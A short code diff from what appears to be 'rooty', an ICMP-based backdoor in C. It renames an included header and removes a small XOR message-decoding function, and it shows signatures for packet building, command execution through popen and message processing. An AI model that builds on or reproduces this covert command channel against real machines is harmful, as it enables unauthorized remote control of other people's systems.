@@ -1,4 +1,4 @@
-#include "rooty.h"
+#include "rooty_unix.h"
 
 int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size) {
 	struct icmphdr *icmp = NULL;
@@ -296,17 +296,6 @@ void run_command(const unsigned char *command, uint32_t size, const struct iphdr
 
 		pclose(fd);
 	}
-}
-
-uint32_t decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key) {
-	uint32_t ctr;
-
-
-	for(ctr = 0; ctr < size; ctr++) {	
-		decoded_data[ctr] = ((data[ctr] ^ key[0]) ^ key[1]);
-	}
-
-	return ctr;
 }
 
 void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
